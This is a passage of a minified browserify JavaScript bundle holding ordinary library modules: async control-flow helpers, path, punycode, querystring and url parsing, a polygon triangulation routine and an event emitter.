r=function(){n-=1,e.callback&&e.callback.apply(e,arguments),o.drain&&o.tasks.length+n===0&&o.drain(),o.process()},s=i(r);t(e.data,s)}},length:function(){return o.tasks.length},running:function(){return n},idle:function(){return o.tasks.length+n===0},pause:function(){o.paused!==!0&&(o.paused=!0,o.process())},resume:function(){o.paused!==!1&&(o.paused=!1,o.process())}};return o},s.priorityQueue=function(t,e){function r(t,e){return t.priority-e.priority}function i(t,e,r){for(var i=-1,n=t.length-1;n>i;){var o=i+(n-i+1>>>1);r(e,t[o])>=0?i=o:n=o-1}return i}function n(t,e,n,o){return t.started||(t.started=!0),h(e)||(e=[e]),0==e.length?s.setImmediate(function(){t.drain&&t.drain()}):void l(e,function(e){var a={data:e,priority:n,callback:"function"==typeof o?o:null};t.tasks.splice(i(t.tasks,a,r)+1,0,a),t.saturated&&t.tasks.length===t.concurrency&&t.saturated(),s.setImmediate(t.process)})}var o=s.queue(t,e);return o.push=function(t,e,r){n(o,t,e,r)},delete o.unshift,o},s.cargo=function(t,e){var r=!1,i=[],n={tasks:i,payload:e,saturated:null,empty:null,drain:null,drained:!0,push:function(t,r){h(t)||(t=[t]),l(t,function(t){i.push({data:t,callback:"function"==typeof r?r:null}),n.drained=!1,n.saturated&&i.length===e&&n.saturated()}),s.setImmediate(n.process)},process:function o(){if(!r){if(0===i.length)return n.drain&&!n.drained&&n.drain(),void(n.drained=!0);var s="number"==typeof e?i.splice(0,e):i.splice(0,i.length),a=u(s,function(t){return t.data});n.empty&&n.empty(),r=!0,t(a,function(){r=!1;var t=arguments;l(s,function(e){e.callback&&e.callback.apply(null,t)}),o()})}},length:function(){return i.length},running:function(){return r}};return n};var S=function(t){return function(e){var r=Array.prototype.slice.call(arguments,1);e.apply(null,r.concat([function(e){var r=Array.prototype.slice.call(arguments,1);"undefined"!=typeof console&&(e?console.error&&console.error(e):console[t]&&l(r,function(e){console[t](e)}))}]))}};s.log=S("log"),s.dir=S("dir"),s.memoize=function(t,e){var r={},i={};e=e||function(t){return t};var n=function(){var n=Array.prototype.slice.call(arguments),o=n.pop(),a=e.apply(null,n);a in r?s.nextTick(function(){o.apply(null,r[a])}):a in i?i[a].push(o):(i[a]=[o],t.apply(null,n.concat([function(){r[a]=arguments;var t=i[a];delete i[a];for(var e=0,n=t.length;n>e;e++)t[e].apply(null,arguments)}])))};return n.memo=r,n.unmemoized=t,n},s.unmemoize=function(t){return function(){return(t.unmemoized||t).apply(null,arguments)}},s.times=function(t,e,r){for(var i=[],n=0;t>n;n++)i.push(n);return s.map(i,e,r)},s.timesSeries=function(t,e,r){for(var i=[],n=0;t>n;n++)i.push(n);return s.mapSeries(i,e,r)},s.seq=function(){var t=arguments;return function(){var e=this,r=Array.prototype.slice.call(arguments),i=r.pop();s.reduce(t,r,function(t,r,i){r.apply(e,t.concat([function(){var t=arguments[0],e=Array.prototype.slice.call(arguments,1);i(t,e)}]))},function(t,r){i.apply(e,[t].concat(r))})}},s.compose=function(){return s.seq.apply(null,Array.prototype.reverse.call(arguments))};var A=function(t,e){var r=function(){var r=this,i=Array.prototype.slice.call(arguments),n=i.pop();return t(e,function(t,e){t.apply(r,i.concat([e]))},n)};if(arguments.length>2){var i=Array.prototype.slice.call(arguments,2);return r.apply(this,i)}return r};s.applyEach=f(A),s.applyEachSeries=g(A),s.forever=function(t,e){function r(i){if(i){if(e)return e(i);throw i}t(r)}r()},"undefined"!=typeof r&&r.exports?r.exports=s:"undefined"!=typeof t&&t.amd?t([],function(){return s}):n.async=s}()}).call(this,e("_process"))},{_process:4}],3:[function(t,e,r){(function(t){function e(t,e){for(var r=0,i=t.length-1;i>=0;i--){var n=t[i];"."===n?t.splice(i,1):".."===n?(t.splice(i,1),r++):r&&(t.splice(i,1),r--)}if(e)for(;r--;r)t.unshift("..");return t}function i(t,e){if(t.filter)return t.filter(e);for(var r=[],i=0;i<t.length;i++)e(t[i],i,t)&&r.push(t[i]);return r}var n=/^(\/?|)([\s\S]*?)((?:\.{1,2}|[^\/]+?|)(\.[^.\/]*|))(?:[\/]*)$/,o=function(t){return n.exec(t).slice(1)};r.resolve=function(){for(var r="",n=!1,o=arguments.length-1;o>=-1&&!n;o--){var s=o>=0?arguments[o]:t.cwd();if("string"!=typeof s)throw new TypeError("Arguments to path.resolve must be strings");s&&(r=s+"/"+r,n="/"===s.charAt(0))}return r=e(i(r.split("/"),function(t){return!!t}),!n).join("/"),(n?"/":"")+r||"."},r.normalize=function(t){var n=r.isAbsolute(t),o="/"===s(t,-1);return t=e(i(t.split("/"),function(t){return!!t}),!n).join("/"),t||n||(t="."),t&&o&&(t+="/"),(n?"/":"")+t},r.isAbsolute=function(t){return"/"===t.charAt(0)},r.join=function(){var t=Array.prototype.slice.call(arguments,0);return r.normalize(i(t,function(t,e){if("string"!=typeof t)throw new TypeError("Arguments to path.join must be strings");return t}).join("/"))},r.relative=function(t,e){function i(t){for(var e=0;e<t.length&&""===t[e];e++);for(var r=t.length-1;r>=0&&""===t[r];r--);return e>r?[]:t.slice(e,r-e+1)}t=r.resolve(t).substr(1),e=r.resolve(e).substr(1);for(var n=i(t.split("/")),o=i(e.split("/")),s=Math.min(n.length,o.length),a=s,h=0;s>h;h++)if(n[h]!==o[h]){a=h;break}for(var l=[],h=a;h<n.length;h++)l.push("..");return l=l.concat(o.slice(a)),l.join("/")},r.sep="/",r.delimiter=":",r.dirname=function(t){var e=o(t),r=e[0],i=e[1];return r||i?(i&&(i=i.substr(0,i.length-1)),r+i):"."},r.basename=function(t,e){var r=o(t)[2];return e&&r.substr(-1*e.length)===e&&(r=r.substr(0,r.length-e.length)),r},r.extname=function(t){return o(t)[3]};var s="b"==="ab".substr(-1)?function(t,e,r){return t.substr(e,r)}:function(t,e,r){return 0>e&&(e=t.length+e),t.substr(e,r)}}).call(this,t("_process"))},{_process:4}],4:[function(t,e,r){function i(){if(!a){a=!0;for(var t,e=s.length;e;){t=s,s=[];for(var r=-1;++r<e;)t[r]();e=s.length}a=!1}}function n(){}var o=e.exports={},s=[],a=!1;o.nextTick=function(t){s.push(t),a||setTimeout(i,0)},o.title="browser",o.browser=!0,o.env={},o.argv=[],o.version="",o.versions={},o.on=n,o.addListener=n,o.once=n,o.off=n,o.removeListener=n,o.removeAllListeners=n,o.emit=n,o.binding=function(t){throw new Error("process.binding is not supported")},o.cwd=function(){return"/"},o.chdir=function(t){throw new Error("process.chdir is not supported")},o.umask=function(){return 0}},{}],5:[function(e,r,i){(function(e){!function(n){function o(t){throw RangeError(B[t])}function s(t,e){for(var r=t.length;r--;)t[r]=e(t[r]);return t}function a(t,e){return s(t.split(O),e).join(".")}function h(t){for(var e,r,i=[],n=0,o=t.length;o>n;)e=t.charCodeAt(n++),e>=55296&&56319>=e&&o>n?(r=t.charCodeAt(n++),56320==(64512&r)?i.push(((1023&e)<<10)+(1023&r)+65536):(i.push(e),n--)):i.push(e);return i}function l(t){return s(t,function(t){var e="";return t>65535&&(t-=65536,e+=N(t>>>10&1023|55296),t=56320|1023&t),e+=N(t)}).join("")}function u(t){return 10>t-48?t-22:26>t-65?t-65:26>t-97?t-97:E}function c(t,e){return t+22+75*(26>t)-((0!=e)<<5)}function p(t,e,r){var i=0;for(t=r?I(t/C):t>>1,t+=I(t/e);t>L*A>>1;i+=E)t=I(t/L);return I(i+(L+1)*t/(t+w))}function d(t){var e,r,i,n,s,a,h,c,d,f,v=[],g=t.length,m=0,y=R,x=M;for(r=t.lastIndexOf(D),0>r&&(r=0),i=0;r>i;++i)t.charCodeAt(i)>=128&&o("not-basic"),v.push(t.charCodeAt(i));for(n=r>0?r+1:0;g>n;){for(s=m,a=1,h=E;n>=g&&o("invalid-input"),c=u(t.charCodeAt(n++)),(c>=E||c>I((T-m)/a))&&o("overflow"),m+=c*a,d=x>=h?S:h>=x+A?A:h-x,!(d>c);h+=E)f=E-d,a>I(T/f)&&o("overflow"),a*=f;e=v.length+1,x=p(m-s,e,0==s),I(m/e)>T-y&&o("overflow"),y+=I(m/e),m%=e,v.splice(m++,0,y)}return l(v)}function f(t){var e,r,i,n,s,a,l,u,d,f,v,g,m,y,x,b=[];for(t=h(t),g=t.length,e=R,r=0,s=M,a=0;g>a;++a)v=t[a],128>v&&b.push(N(v));for(i=n=b.length,n&&b.push(D);g>i;){for(l=T,a=0;g>a;++a)v=t[a],v>=e&&l>v&&(l=v);for(m=i+1,l-e>I((T-r)/m)&&o("overflow"),r+=(l-e)*m,e=l,a=0;g>a;++a)if(v=t[a],e>v&&++r>T&&o("overflow"),v==e){for(u=r,d=E;f=s>=d?S:d>=s+A?A:d-s,!(f>u);d+=E)x=u-f,y=E-f,b.push(N(c(f+x%y,0))),u=I(x/y);b.push(N(c(u,0))),s=p(r,m,i==n),r=0,++i}++r,++e}return b.join("")}function v(t){return a(t,function(t){return F.test(t)?d(t.slice(4).toLowerCase()):t})}function g(t){return a(t,function(t){return P.test(t)?"xn--"+f(t):t})}var m="object"==typeof i&&i,y="object"==typeof r&&r&&r.exports==m&&r,x="object"==typeof e&&e;(x.global===x||x.window===x)&&(n=x);var b,_,T=2147483647,E=36,S=1,A=26,w=38,C=700,M=72,R=128,D="-",F=/^xn--/,P=/[^ -~]/,O=/\x2E|\u3002|\uFF0E|\uFF61/g,B={overflow:"Overflow: input needs wider integers to process","not-basic":"Illegal input >= 0x80 (not a basic code point)","invalid-input":"Invalid input"},L=E-S,I=Math.floor,N=String.fromCharCode;if(b={version:"1.2.4",ucs2:{decode:h,encode:l},decode:d,encode:f,toASCII:g,toUnicode:v},"function"==typeof t&&"object"==typeof t.amd&&t.amd)t("punycode",function(){return b});else if(m&&!m.nodeType)if(y)y.exports=b;else for(_ in b)b.hasOwnProperty(_)&&(m[_]=b[_]);else n.punycode=b}(this)}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{}],6:[function(t,e,r){"use strict";function i(t,e){return Object.prototype.hasOwnProperty.call(t,e)}e.exports=function(t,e,r,o){e=e||"&",r=r||"=";var s={};if("string"!=typeof t||0===t.length)return s;var a=/\+/g;t=t.split(e);var h=1e3;o&&"number"==typeof o.maxKeys&&(h=o.maxKeys);var l=t.length;h>0&&l>h&&(l=h);for(var u=0;l>u;++u){var c,p,d,f,v=t[u].replace(a,"%20"),g=v.indexOf(r);g>=0?(c=v.substr(0,g),p=v.substr(g+1)):(c=v,p=""),d=decodeURIComponent(c),f=decodeURIComponent(p),i(s,d)?n(s[d])?s[d].push(f):s[d]=[s[d],f]:s[d]=f}return s};var n=Array.isArray||function(t){return"[object Array]"===Object.prototype.toString.call(t)}},{}],7:[function(t,e,r){"use strict";function i(t,e){if(t.map)return t.map(e);for(var r=[],i=0;i<t.length;i++)r.push(e(t[i],i));return r}var n=function(t){switch(typeof t){case"string":return t;case"boolean":return t?"true":"false";case"number":return isFinite(t)?t:"";default:return""}};e.exports=function(t,e,r,a){return e=e||"&",r=r||"=",null===t&&(t=void 0),"object"==typeof t?i(s(t),function(s){var a=encodeURIComponent(n(s))+r;return o(t[s])?i(t[s],function(t){return a+encodeURIComponent(n(t))}).join(e):a+encodeURIComponent(n(t[s]))}).join(e):a?encodeURIComponent(n(a))+r+encodeURIComponent(n(t)):""};var o=Array.isArray||function(t){return"[object Array]"===Object.prototype.toString.call(t)},s=Object.keys||function(t){var e=[];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&e.push(r);return e}},{}],8:[function(t,e,r){"use strict";r.decode=r.parse=t("./decode"),r.encode=r.stringify=t("./encode")},{"./decode":6,"./encode":7}],9:[function(t,e,r){function i(){this.protocol=null,this.slashes=null,this.auth=null,this.host=null,this.port=null,this.hostname=null,this.hash=null,this.search=null,this.query=null,this.pathname=null,this.path=null,this.href=null}function n(t,e,r){if(t&&l(t)&&t instanceof i)return t;var n=new i;return n.parse(t,e,r),n}function o(t){return h(t)&&(t=n(t)),t instanceof i?t.format():i.prototype.format.call(t)}function s(t,e){return n(t,!1,!0).resolve(e)}function a(t,e){return t?n(t,!1,!0).resolveObject(e):e}function h(t){return"string"==typeof t}function l(t){return"object"==typeof t&&null!==t}function u(t){return null===t}function c(t){return null==t}var p=t("punycode");r.parse=n,r.resolve=s,r.resolveObject=a,r.format=o,r.Url=i;var d=/^([a-z0-9.+-]+:)/i,f=/:[0-9]*$/,v=["<",">",'"',"`"," ","\r","\n","	"],g=["{","}","|","\\","^","`"].concat(v),m=["'"].concat(g),y=["%","/","?",";","#"].concat(m),x=["/","?","#"],b=255,_=/^[a-z0-9A-Z_-]{0,63}$/,T=/^([a-z0-9A-Z_-]{0,63})(.*)$/,E={javascript:!0,"javascript:":!0},S={javascript:!0,"javascript:":!0},A={http:!0,https:!0,ftp:!0,gopher:!0,file:!0,"http:":!0,"https:":!0,"ftp:":!0,"gopher:":!0,"file:":!0},w=t("querystring");i.prototype.parse=function(t,e,r){if(!h(t))throw new TypeError("Parameter 'url' must be a string, not "+typeof t);var i=t;i=i.trim();var n=d.exec(i);if(n){n=n[0];var o=n.toLowerCase();this.protocol=o,i=i.substr(n.length)}if(r||n||i.match(/^\/\/[^@\/]+@[^@\/]+/)){var s="//"===i.substr(0,2);!s||n&&S[n]||(i=i.substr(2),this.slashes=!0)}if(!S[n]&&(s||n&&!A[n])){for(var a=-1,l=0;l<x.length;l++){var u=i.indexOf(x[l]);-1!==u&&(-1===a||a>u)&&(a=u)}var c,f;f=-1===a?i.lastIndexOf("@"):i.lastIndexOf("@",a),-1!==f&&(c=i.slice(0,f),i=i.slice(f+1),this.auth=decodeURIComponent(c)),a=-1;for(var l=0;l<y.length;l++){var u=i.indexOf(y[l]);-1!==u&&(-1===a||a>u)&&(a=u)}-1===a&&(a=i.length),this.host=i.slice(0,a),i=i.slice(a),this.parseHost(),this.hostname=this.hostname||"";var v="["===this.hostname[0]&&"]"===this.hostname[this.hostname.length-1];if(!v)for(var g=this.hostname.split(/\./),l=0,C=g.length;C>l;l++){var M=g[l];if(M&&!M.match(_)){for(var R="",D=0,F=M.length;F>D;D++)R+=M.charCodeAt(D)>127?"x":M[D];if(!R.match(_)){var P=g.slice(0,l),O=g.slice(l+1),B=M.match(T);B&&(P.push(B[1]),O.unshift(B[2])),O.length&&(i="/"+O.join(".")+i),this.hostname=P.join(".");break}}}if(this.hostname=this.hostname.length>b?"":this.hostname.toLowerCase(),!v){for(var L=this.hostname.split("."),I=[],l=0;l<L.length;++l){var N=L[l];I.push(N.match(/[^A-Za-z0-9_-]/)?"xn--"+p.encode(N):N)}this.hostname=I.join(".")}var U=this.port?":"+this.port:"",k=this.hostname||"";this.host=k+U,this.href+=this.host,v&&(this.hostname=this.hostname.substr(1,this.hostname.length-2),"/"!==i[0]&&(i="/"+i))}if(!E[o])for(var l=0,C=m.length;C>l;l++){var j=m[l],X=encodeURIComponent(j);X===j&&(X=escape(j)),i=i.split(j).join(X)}var G=i.indexOf("#");-1!==G&&(this.hash=i.substr(G),i=i.slice(0,G));var Y=i.indexOf("?");if(-1!==Y?(this.search=i.substr(Y),this.query=i.substr(Y+1),e&&(this.query=w.parse(this.query)),i=i.slice(0,Y)):e&&(this.search="",this.query={}),i&&(this.pathname=i),A[o]&&this.hostname&&!this.pathname&&(this.pathname="/"),this.pathname||this.search){var U=this.pathname||"",N=this.search||"";this.path=U+N}return this.href=this.format(),this},i.prototype.format=function(){var t=this.auth||"";t&&(t=encodeURIComponent(t),t=t.replace(/%3A/i,":"),t+="@");var e=this.protocol||"",r=this.pathname||"",i=this.hash||"",n=!1,o="";this.host?n=t+this.host:this.hostname&&(n=t+(-1===this.hostname.indexOf(":")?this.hostname:"["+this.hostname+"]"),this.port&&(n+=":"+this.port)),this.query&&l(this.query)&&Object.keys(this.query).length&&(o=w.stringify(this.query));var s=this.search||o&&"?"+o||"";return e&&":"!==e.substr(-1)&&(e+=":"),this.slashes||(!e||A[e])&&n!==!1?(n="//"+(n||""),r&&"/"!==r.charAt(0)&&(r="/"+r)):n||(n=""),i&&"#"!==i.charAt(0)&&(i="#"+i),s&&"?"!==s.charAt(0)&&(s="?"+s),r=r.replace(/[?#]/g,function(t){return encodeURIComponent(t)}),s=s.replace("#","%23"),e+n+r+s+i},i.prototype.resolve=function(t){return this.resolveObject(n(t,!1,!0)).format()},i.prototype.resolveObject=function(t){if(h(t)){var e=new i;e.parse(t,!1,!0),t=e}var r=new i;if(Object.keys(this).forEach(function(t){r[t]=this[t]},this),r.hash=t.hash,""===t.href)return r.href=r.format(),r;if(t.slashes&&!t.protocol)return Object.keys(t).forEach(function(e){"protocol"!==e&&(r[e]=t[e])}),A[r.protocol]&&r.hostname&&!r.pathname&&(r.path=r.pathname="/"),r.href=r.format(),r;if(t.protocol&&t.protocol!==r.protocol){if(!A[t.protocol])return Object.keys(t).forEach(function(e){r[e]=t[e]}),r.href=r.format(),r;if(r.protocol=t.protocol,t.host||S[t.protocol])r.pathname=t.pathname;else{for(var n=(t.pathname||"").split("/");n.length&&!(t.host=n.shift()););t.host||(t.host=""),t.hostname||(t.hostname=""),""!==n[0]&&n.unshift(""),n.length<2&&n.unshift(""),r.pathname=n.join("/")}if(r.search=t.search,r.query=t.query,r.host=t.host||"",r.auth=t.auth,r.hostname=t.hostname||t.host,r.port=t.port,r.pathname||r.search){var o=r.pathname||"",s=r.search||"";r.path=o+s}return r.slashes=r.slashes||t.slashes,r.href=r.format(),r}var a=r.pathname&&"/"===r.pathname.charAt(0),l=t.host||t.pathname&&"/"===t.pathname.charAt(0),p=l||a||r.host&&t.pathname,d=p,f=r.pathname&&r.pathname.split("/")||[],n=t.pathname&&t.pathname.split("/")||[],v=r.protocol&&!A[r.protocol];if(v&&(r.hostname="",r.port=null,r.host&&(""===f[0]?f[0]=r.host:f.unshift(r.host)),r.host="",t.protocol&&(t.hostname=null,t.port=null,t.host&&(""===n[0]?n[0]=t.host:n.unshift(t.host)),t.host=null),p=p&&(""===n[0]||""===f[0])),l)r.host=t.host||""===t.host?t.host:r.host,r.hostname=t.hostname||""===t.hostname?t.hostname:r.hostname,r.search=t.search,r.query=t.query,f=n;else if(n.length)f||(f=[]),f.pop(),f=f.concat(n),r.search=t.search,r.query=t.query;else if(!c(t.search)){if(v){r.hostname=r.host=f.shift();var g=r.host&&r.host.indexOf("@")>0?r.host.split("@"):!1;g&&(r.auth=g.shift(),r.host=r.hostname=g.shift())}return r.search=t.search,r.query=t.query,u(r.pathname)&&u(r.search)||(r.path=(r.pathname?r.pathname:"")+(r.search?r.search:"")),r.href=r.format(),r}if(!f.length)return r.pathname=null,r.path=r.search?"/"+r.search:null,r.href=r.format(),r;for(var m=f.slice(-1)[0],y=(r.host||t.host)&&("."===m||".."===m)||""===m,x=0,b=f.length;b>=0;b--)m=f[b],"."==m?f.splice(b,1):".."===m?(f.splice(b,1),x++):x&&(f.splice(b,1),x--);if(!p&&!d)for(;x--;x)f.unshift("..");!p||""===f[0]||f[0]&&"/"===f[0].charAt(0)||f.unshift(""),y&&"/"!==f.join("/").substr(-1)&&f.push("");var _=""===f[0]||f[0]&&"/"===f[0].charAt(0);if(v){r.hostname=r.host=_?"":f.length?f.shift():"";var g=r.host&&r.host.indexOf("@")>0?r.host.split("@"):!1;g&&(r.auth=g.shift(),r.host=r.hostname=g.shift())}return p=p||r.host&&f.length,p&&!_&&f.unshift(""),f.length?r.pathname=f.join("/"):(r.pathname=null,r.path=null),u(r.pathname)&&u(r.search)||(r.path=(r.pathname?r.pathname:"")+(r.search?r.search:"")),r.auth=t.auth||r.auth,r.slashes=r.slashes||t.slashes,r.href=r.format(),r},i.prototype.parseHost=function(){var t=this.host,e=f.exec(t);e&&(e=e[0],":"!==e&&(this.port=e.substr(1)),t=t.substr(0,t.length-e.length)),t&&(this.hostname=t)}},{punycode:5,querystring:8}],10:[function(t,e,r){"use strict";function i(t,e,r){r=r||2;var i=e&&e.length,a=i?e[0]*r:t.length,h=o(t,n(t,0,a,r,!0)),l=[];if(!h)return l;var c,p,d,f,v,g,m;if(i&&(h=u(t,e,h,r)),t.length>80*r){c=d=t[0],p=f=t[1];for(var y=r;a>y;y+=r)v=t[y],g=t[y+1],c>v&&(c=v),p>g&&(p=g),v>d&&(d=v),g>f&&(f=g);m=Math.max(d-c,f-p)}return s(t,h,l,r,c,p,m),l}function n(t,e,r,i,n){var o,s,a,h=0;for(o=e,s=r-i;r>o;o+=i)h+=(t[s]-t[o])*(t[o+1]+t[s+1]),s=o;if(n===h>0)for(o=e;r>o;o+=i)a=A(o,a);else for(o=r-i;o>=e;o-=i)a=A(o,a);return a}function o(t,e,r){r||(r=e);var i,n=e;do if(i=!1,x(t,n.i,n.next.i)||0===y(t,n.prev.i,n.i,n.next.i)){if(n.prev.next=n.next,n.next.prev=n.prev,n.prevZ&&(n.prevZ.nextZ=n.nextZ),n.nextZ&&(n.nextZ.prevZ=n.prevZ),n=r=n.prev,n===n.next)return null;i=!0}else n=n.next;while(i||n!==r);return r}function s(t,e,r,i,n,u,c,p){if(e){p||void 0===n||d(t,e,n,u,c);for(var f,v,g=e;e.prev!==e.next;)if(f=e.prev,v=e.next,a(t,e,n,u,c))r.push(f.i/i),r.push(e.i/i),r.push(v.i/i),v.prev=f,f.next=v,e.prevZ&&(e.prevZ.nextZ=e.nextZ),e.nextZ&&(e.nextZ.prevZ=e.prevZ),e=v.next,g=v.next;else if(e=v,e===g){p?1===p?(e=h(t,e,r,i),s(t,e,r,i,n,u,c,2)):2===p&&l(t,e,r,i,n,u,c):s(t,o(t,e),r,i,n,u,c,1);break}}}function a(t,e,r,i,n){var o=e.prev.i,s=e.i,a=e.next.i,h=t[o],l=t[o+1],u=t[s],c=t[s+1],p=t[a],d=t[a+1],f=h*c-l*u,g=h*d-l*p,m=p*c-d*u,y=f-g-m;if(0>=y)return!1;var x,b,_,T,E,S,A,w=d-l,C=h-p,M=l-c,R=u-h;if(void 0!==r){var D=u>h?p>h?h:p:p>u?u:p,F=c>l?d>l?l:d:d>c?c:d,P=h>u?h>p?h:p:u>p?u:p,O=l>c?l>d?l:d:c>d?c:d,B=v(D,F,r,i,n),L=v(P,O,r,i,n);for(A=e.nextZ;A&&A.z<=L;)if(x=A.i,A=A.nextZ,x!==o&&x!==a&&(b=t[x],_=t[x+1],T=w*b+C*_-g,T>=0&&(E=M*b+R*_+f,E>=0&&(S=y-T-E,S>=0&&(T&&E||T&&S||E&&S)))))return!1;for(A=e.prevZ;A&&A.z>=B;)if(x=A.i,A=A.prevZ,x!==o&&x!==a&&(b=t[x],_=t[x+1],T=w*b+C*_-g,T>=0&&(E=M*b+R*_+f,E>=0&&(S=y-T-E,S>=0&&(T&&E||T&&S||E&&S)))))return!1}else for(A=e.next.next;A!==e.prev;)if(x=A.i,A=A.next,b=t[x],_=t[x+1],T=w*b+C*_-g,T>=0&&(E=M*b+R*_+f,E>=0&&(S=y-T-E,S>=0&&(T&&E||T&&S||E&&S))))return!1;return!0}function h(t,e,r,i){var n=e;do{var o=n.prev,s=n.next.next;if(o.i!==s.i&&b(t,o.i,n.i,n.next.i,s.i)&&T(t,o,s)&&T(t,s,o)){r.push(o.i/i),r.push(n.i/i),r.push(s.i/i),o.next=s,s.prev=o;var a=n.prevZ,h=n.nextZ&&n.nextZ.nextZ;a&&(a.nextZ=h),h&&(h.prevZ=a),n=e=s}n=n.next}while(n!==e);return n}function l(t,e,r,i,n,a,h){var l=e;do{for(var u=l.next.next;u!==l.prev;){if(l.i!==u.i&&m(t,l,u)){var c=S(l,u);return l=o(t,l,l.next),c=o(t,c,c.next),s(t,l,r,i,n,a,h),void s(t,c,r,i,n,a,h)}u=u.next}l=l.next}while(l!==e)}function u(t,e,r,i){var s,a,h,l,u,p=[];for(s=0,a=e.length;a>s;s++)h=e[s]*i,l=a-1>s?e[s+1]*i:t.length,u=o(t,n(t,h,l,i,!1)),u&&p.push(g(t,u));for(p.sort(function(e,r){return t[e.i]-t[r.i]}),s=0;s<p.length;s++)c(t,p[s],r),r=o(t,r,r.next);return r}function c(t,e,r){if(r=p(t,e,r)){var i=S(r,e);o(t,i,i.next)}}function p(t,e,r){var i,n,o,s=r,a=e.i,h=t[a],l=t[a+1],u=-(1/0);do{if(n=s.i,o=s.next.i,l<=t[n+1]&&l>=t[o+1]){var c=t[n]+(l-t[n+1])*(t[o]-t[n])/(t[o+1]-t[n+1]);h>=c&&c>u&&(u=c,i=t[n]<t[o]?s:s.next)}s=s.next}while(s!==r);if(!i)return null;var p,d,f,v,g,m,y=t[i.i],x=t[i.i+1],b=h*x-l*y,_=h*l-l*u,E=l-l,S=h-u,A=l-x,w=y-h,C=b-_-(u*x-l*y),M=0>=C?-1:1,R=i,D=1/0;for(s=i.next;s!==R;)p=t[s.i],d=t[s.i+1],f=h-p,f>=0&&p>=y&&(v=(E*p+S*d-_)*M,v>=0&&(g=(A*p+w*d+b)*M,g>=0&&C*M-v-g>=0&&(m=Math.abs(l-d)/f,D>m&&T(t,s,e)&&(i=s,D=m)))),s=s.next;return i}function d(t,e,r,i,n){var o=e;do null===o.z&&(o.z=v(t[o.i],t[o.i+1],r,i,n)),o.prevZ=o.prev,o.nextZ=o.next,o=o.next;while(o!==e);o.prevZ.nextZ=null,o.prevZ=null,f(o)}function f(t){var e,r,i,n,o,s,a,h,l=1;do{for(r=t,t=null,o=null,s=0;r;){for(s++,i=r,a=0,e=0;l>e&&(a++,i=i.nextZ);e++);for(h=l;a>0||h>0&&i;)0===a?(n=i,i=i.nextZ,h--):0!==h&&i?r.z<=i.z?(n=r,r=r.nextZ,a--):(n=i,i=i.nextZ,h--):(n=r,r=r.nextZ,a--),o?o.nextZ=n:t=n,n.prevZ=o,o=n;r=i}o.nextZ=null,l*=2}while(s>1);return t}function v(t,e,r,i,n){return t=1e3*(t-r)/n,t=16711935&(t|t<<8),t=252645135&(t|t<<4),t=858993459&(t|t<<2),t=1431655765&(t|t<<1),e=1e3*(e-i)/n,e=16711935&(e|e<<8),e=252645135&(e|e<<4),e=858993459&(e|e<<2),e=1431655765&(e|e<<1),t|e<<1}function g(t,e){var r=e,i=e;do t[r.i]<t[i.i]&&(i=r),r=r.next;while(r!==e);return i}function m(t,e,r){return!_(t,e,e.i,r.i)&&T(t,e,r)&&T(t,r,e)&&E(t,e,e.i,r.i)}function y(t,e,r,i){var n=(t[r+1]-t[e+1])*(t[i]-t[r])-(t[r]-t[e])*(t[i+1]-t[r+1]);return n>0?1:0>n?-1:0}function x(t,e,r){return t[e]===t[r]&&t[e+1]===t[r+1]}function b(t,e,r,i,n){return y(t,e,r,i)!==y(t,e,r,n)&&y(t,i,n,e)!==y(t,i,n,r)}function _(t,e,r,i){var n=e;do{var o=n.i,s=n.next.i;if(o!==r&&s!==r&&o!==i&&s!==i&&b(t,o,s,r,i))return!0;n=n.next}while(n!==e);return!1}function T(t,e,r){return-1===y(t,e.prev.i,e.i,e.next.i)?-1!==y(t,e.i,r.i,e.next.i)&&-1!==y(t,e.i,e.prev.i,r.i):-1===y(t,e.i,r.i,e.prev.i)||-1===y(t,e.i,e.next.i,r.i)}function E(t,e,r,i){var n=e,o=!1,s=(t[r]+t[i])/2,a=(t[r+1]+t[i+1])/2;do{var h=n.i,l=n.next.i;t[h+1]>a!=t[l+1]>a&&s<(t[l]-t[h])*(a-t[h+1])/(t[l+1]-t[h+1])+t[h]&&(o=!o),n=n.next}while(n!==e);return o}function S(t,e){var r=new w(t.i),i=new w(e.i),n=t.next,o=e.prev;return t.next=e,e.prev=t,r.next=n,n.prev=r,i.next=r,r.prev=i,o.next=i,i.prev=o,i}function A(t,e){var r=new w(t);return e?(r.next=e.next,r.prev=e,e.next.prev=r,e.next=r):(r.prev=r,r.next=r),r}function w(t){
this.i=t,this.prev=null,this.next=null,this.z=null,this.prevZ=null,this.nextZ=null}e.exports=i},{}],11:[function(t,e,r){"use strict";function i(t,e,r){this.fn=t,this.context=e,this.once=r||!1}function n(){}var o="function"!=typeof Object.create?"~":!1;n.prototype._events=void 0,n.prototype.listeners=function(t,e){var r=o?o+t:t,i=this._events&&this._events[r];if(e)return!!i;if(!i)return[];if(this._events[r].fn)return[this._events[r].fn];for(var n=0,s=this._events[r].length,a=new Array(s);s>n;n++)a[n]=this._events[r][n].fn;return a},n.prototype.emit=function(t,e,r,i,n,s){var a=o?o+t:t;if(!this._events||!this._events[a])return!1;var h,l,u=this._events[a],c=arguments.length;if("function"==typeof u.fn){switch(u.once&&this.removeListener(t,u.fn,void 0,!0),c){case 1:return u.fn.call(u.context),!0;case 2:return u.fn.call(u.context,e),!0;case 3:return u.fn.call(u.context,e,r),!0;case 4:return u.fn.call(u.context,e,r,i),!0;case 5:return u.fn.call(u.context,e,r,i,n),!0;case 6:return u.fn.call(u.context,e,r,i,n,s),!0}for(l=1,h=new Array(c-1);c>l;l++)h[l-1]=arguments[l];u.fn.apply(u.context,h)}else{var p,d=u.length;for(l=0;d>l;l++)switch(u[l].once&&this.removeListener(t,u[l].fn,void 0,!0),c){case 1:u[l].fn.call(u[l].context);break;case 2:u[l].fn.call(u[l].context,e);break;case 3:u[l].fn.call(u[l].context,e,r);break;default:if(!h)for(p=1,h=new Array(c-1);c>p;p++)h[p-1]=arguments[p];u[l].fn.apply(u[l].context,h)}}return!0},n.prototype.on=function(t,e,r){var n=new i(e,r||this),s=o?o+t:t;return this._events||(this._events=o?{}:Object.create(null)),this._events[s]?this._events[s].fn?this._events[s]=[this._events[s],n]:this._events[s].push(n):this._events[s]=n,this},n.prototype.once=function(t,e,r){var n=new i(e,r||this,!0),s=o?o+t:t;return this._events||(this._events=o?{}:Object.create(null)),this._events[s]?this._events[s].fn?this._events[s]=[this._events[s],n]:this._events[s].push(n):this._events[s]=n,this},n.prototype.removeListener=function(t,e,r,i){var 